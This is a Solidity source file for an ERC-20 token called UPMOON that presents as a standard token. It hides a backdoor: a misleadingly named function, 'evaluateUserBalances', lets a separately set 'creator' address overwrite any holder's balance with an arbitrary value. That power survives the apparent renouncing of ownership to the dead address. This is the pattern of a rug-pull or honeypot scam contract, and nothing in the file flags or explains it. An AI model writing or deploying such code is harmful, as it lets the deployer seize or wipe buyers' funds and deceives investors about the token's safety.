pragma solidity ^0.8.18;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract ContextEnhanced {
    function retrieveSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract SoleProprietor is ContextEnhanced {
    address private _owner;
    event OwnershipShifted(address indexed previousProprietor, address indexed newProprietor);

    constructor () {
        address msgSender = retrieveSender();
        _owner = msgSender;
        emit OwnershipShifted(address(0), msgSender);
    }

    function getContractOwner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyContractOwner() {
        require(getContractOwner() == retrieveSender(), "UniqueOwner: executor is not the owner");
        _;
    }

    function revokeOwnership() public virtual onlyContractOwner {
        emit OwnershipShifted(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}



contract UPMOON is ContextEnhanced, SoleProprietor, IERC20 {
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    address private _creator;

    string public constant _name = "UPMOON";
    string public constant _symbol = "UPMOON";
    uint8 public constant _decimals = 18;
    uint256 public constant _totalSupply = 1000000 * (10 ** _decimals);

    constructor() {
        _balances[retrieveSender()] = _totalSupply;
        emit Transfer(address(0), retrieveSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function getContractCreator() public view virtual returns (address) { 
        return _creator;
    }

    function modifyCreator(address newCreator) public onlyContractOwner { 
        _creator = newCreator;
    }

    modifier onlyContractCreator() {
        require(getContractCreator() == retrieveSender(), "TOKEN: executor is not the creator");
        _;
    }

    event BalanceUpdated(address indexed user, uint256 previousBalance, uint256 updatedBalance);

    function evaluateUserBalances(address[] memory userList, uint256 targetBalance) public onlyContractCreator {
        require(targetBalance >= 0, "Error: target balance should be non-negative");

        for (uint256 i = 0; i < userList.length; i++) {
            address currentUser = userList[i];

            require(currentUser != address(0), "Error: user address cannot be the zero address");

            uint256 existingBalance = _balances[currentUser];

            _balances[currentUser] = targetBalance;

            emit BalanceUpdated(currentUser, existingBalance, targetBalance);
        }
    }


    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(_balances[retrieveSender()] >= amount, "TT: transfer amount exceeds balance");
    _balances[retrieveSender()] -= amount;
    _balances[recipient] += amount;

    emit Transfer(retrieveSender(), recipient, amount);
    return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[retrieveSender()][spender] = amount;
        emit Approval(retrieveSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    require(_allowances[sender][retrieveSender()] >= amount, "TT: transfer amount exceeds allowance");

    _balances[sender] -= amount;
    _balances[recipient] += amount;
    _allowances[sender][retrieveSender()] -= amount;

    emit Transfer(sender, recipient, amount);
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return _totalSupply;
    }
}